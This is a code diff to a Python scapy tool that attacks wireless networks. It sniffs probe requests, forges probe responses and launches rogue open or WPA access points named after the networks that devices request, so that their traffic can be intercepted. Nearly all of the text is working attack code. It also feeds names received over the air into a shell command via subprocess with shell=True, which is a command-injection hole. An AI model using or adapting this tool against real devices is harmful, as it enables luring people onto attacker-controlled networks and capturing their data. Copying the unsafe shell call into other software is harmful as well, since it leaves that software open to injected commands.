@@ -26,7 +26,7 @@ def on_probe(essid, sta, freq, signal, vendor):
 		for file in files:
 			script = os.path.join(cwd, file)
 			if os.access(script, os.X_OK):
-				DEBUG(f'{script} "{essid}" {sta} {freq} {signal} "{vendor}"')
+				#DEBUG(f'{script} "{essid}" {sta} {freq} {signal} "{vendor}"')
 				subprocess.Popen(f'{script} "{essid}" {sta} {freq} {signal} "{vendor}"', shell=True)
 
 def on_network(essid, iface):
@@ -364,7 +364,7 @@ pcap_no = 0
 def parse_raw_80211(p):
 	global known_essids, hostapd_opn, hostapd_wpa, pcap_no
 	if Dot11ProbeReq in p:
-		if p[Dot11Elt].info:
+		if p[Dot11].subtype == 4 and p[Dot11Elt].info:
 			sta = p[Dot11].addr2
 			try:
 				essid = str(p[Dot11Elt].info, "utf-8")
@@ -379,6 +379,7 @@ def parse_raw_80211(p):
 			if not essid in known_essids and not hostapd_opn and not hostapd_wpa:
 				pcap_no += 1
 				#os.system("killall -KILL hostapd 2> /dev/null")
+				probe_response(args.mon, sta, essid)
 				if args.opn:
 					Thread(target=start_AP_OPN, args=(args.opn,essid)).start()
 					known_essids.add(essid)
@@ -386,7 +387,7 @@ def parse_raw_80211(p):
 				if args.wpa:
 					Thread(target=start_AP_WPA, args=(args.wpa,essid)).start()
 					known_essids.add(essid)
-	else:
+'''	else:
 		essid = "test"
 		if not essid in known_essids and not hostapd_opn and not hostapd_wpa:
 			pcap_no += 1
@@ -394,7 +395,7 @@ def parse_raw_80211(p):
 				Thread(target=start_AP_OPN, args=(args.opn,essid)).start()
 			if args.wpa:
 				Thread(target=start_AP_WPA, args=(args.wpa,essid)).start()
-			known_essids.add(essid)
+			known_essids.add(essid)'''
 				
 known_targets = set()
 def parse_client_trafic_OPN(p):
@@ -435,6 +436,15 @@ def get_beacon(essid):
 	beacon = Dot11Beacon(cap='ESS+privacy')
 	essid = Dot11Elt(ID='SSID',info=essid, len=len(essid))
 	return radio/dot11/beacon/essid
+
+def probe_response(iface, target, essid):
+	radio = RadioTap(len=18, present=0x482e,Rate=2,Channel=2412,ChannelFlags=0x00a0,dBm_AntSignal=chr(77),Antenna=1)
+	probe = Dot11(subtype=5, addr1='ff:ff:ff:ff:ff:ff', addr2=target, addr3=target, SC=0x3060)/\
+	 Dot11ProbeResp(timestamp=123123123, beacon_interval=0x0064, cap=0x2104)/\
+	 Dot11Elt(ID='SSID', info=essid)/\
+	 Dot11Elt(ID='Rates', info="\x0c\x12\x18\x24\x30\x48\x60\x6c")/\
+	 Dot11Elt(ID='DSset', info=chr(1))
+	sendp(probe, iface=iface, loop=0)
 
 def sniffer(iface):
 	sniff(iface=iface, prn=parse_raw_80211, store=0)
